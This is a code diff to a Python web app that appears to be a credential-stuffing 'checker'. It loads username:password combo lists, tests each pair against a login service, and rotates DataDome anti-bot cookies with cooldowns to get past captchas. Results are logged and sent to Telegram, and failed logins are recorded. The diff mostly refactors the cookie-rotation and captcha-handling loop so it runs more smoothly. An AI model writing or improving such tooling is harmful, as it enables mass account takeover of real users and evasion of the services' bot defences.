@@ -1,3 +1,5 @@
+#--- START OF FILE app.py ---
+
 # --- START OF FILE app.py ---
 
 import os
@@ -444,6 +446,7 @@ def remove_duplicates_from_file(user_session, file_path):
         final_count = len(unique_lines)
         removed_count = initial_count - final_count
         if removed_count > 0:
+            with open(file_path, 'w', encoding='utf-8') as f: f.write('\n'.join(unique_lines))
             log_message(user_session, f"[✨] Removed {removed_count} duplicate/empty line(s) from '{os.path.basename(file_path)}'.", "text-info")
         return unique_lines, final_count
     except FileNotFoundError:
@@ -530,18 +533,31 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
             original_index = start_from_index + loop_idx
             if stop_event.is_set(): log_message(user_session, "Checker stopped by user.", "text-warning"); break
             with status_lock: check_status.update({'progress': original_index, 'current_account': acc})
+            
             if ':' in acc:
                 username_acc, password = acc.split(':', 1)
                 is_captcha_loop = True
                 while is_captcha_loop and not stop_event.is_set():
                     current_datadome = None
-                    if not cookie_state['pool']: log_message(user_session, "[❌] No cookies available in the pool. Stopping check.", "text-danger"); stop_event.set(); break
+                    if not cookie_state['pool']: 
+                        log_message(user_session, "[❌] No cookies available in the pool. Stopping check.", "text-danger")
+                        stop_event.set()
+                        break
+                    
                     for _ in range(len(cookie_state['pool'])):
                         cookie_state['index'] = (cookie_state['index'] + 1) % len(cookie_state['pool'])
                         potential_cookie = cookie_state['pool'][cookie_state['index']]
-                        if time.time() < cookie_state['cooldown'].get(potential_cookie, 0): continue
-                        current_datadome = potential_cookie; break
-                    if not current_datadome: log_message(user_session, "[❌] All available cookies are on cooldown. Please wait or add new cookies.", "text-danger"); stop_event.set(); break
+                        
+                        cooldown_until = cookie_state['cooldown'].get(potential_cookie)
+                        if cooldown_until and time.time() < cooldown_until:
+                            continue 
+                        current_datadome = potential_cookie
+                        break
+
+                    if not current_datadome: 
+                        log_message(user_session, "[❌] All available cookies are on cooldown. Please wait or add new cookies.", "text-danger")
+                        stop_event.set()
+                        break
 
                     log_message(user_session, f"[▶] Checking: {username_acc}:{password} with cookie ...{current_datadome[-6:]}", "text-info")
                     result = check_account(user_session, username_acc, password, datenok, current_datadome, selected_cookie_module)
@@ -549,12 +565,19 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
                     if result == "[CAPTCHA]":
                         stats['captcha_count'] += 1
                         log_message(user_session, f"[🔴 CAPTCHA] Triggered by cookie ...{current_datadome[-6:]}", "text-danger")
-                        cookie_state['cooldown'][current_datadome] = time.time() + 300
+                        
+                        expiry_time = time.time() + 300
+                        cookie_state['cooldown'][current_datadome] = expiry_time
                         log_message(user_session, f"[⏳] Cookie placed on cooldown for 5 minutes.", "text-warning")
+
                         with status_lock: check_status['captcha_detected'] = True
                         time.sleep(random.uniform(2, 4))
-                        captcha_pause_event.clear(); captcha_pause_event.wait(timeout=30)
+                        
+                        captcha_pause_event.clear()
+                        captcha_pause_event.wait(timeout=30) # Add timeout for serverless env
+                        
                         with status_lock: check_status['captcha_detected'] = False
+                        
                         if stop_event.is_set(): break
                         log_message(user_session, "[🔄] Resuming check for the same account...", "text-info")
                         continue
@@ -583,6 +606,7 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
                     with open(failed_file, 'a', encoding='utf-8') as failed_out: failed_out.write(f"{username_acc}:{password} - {result}\n")
                     log_message(user_session, f"User: {username_acc} | Pass: {password} ➔ {result}", "text-danger")
             else: log_message(user_session, f"Invalid format: {acc} ➔ Skipping", "text-warning")
+            
             with status_lock: check_status['stats'] = stats.copy()
             save_progress(username, file_path, original_index)
         
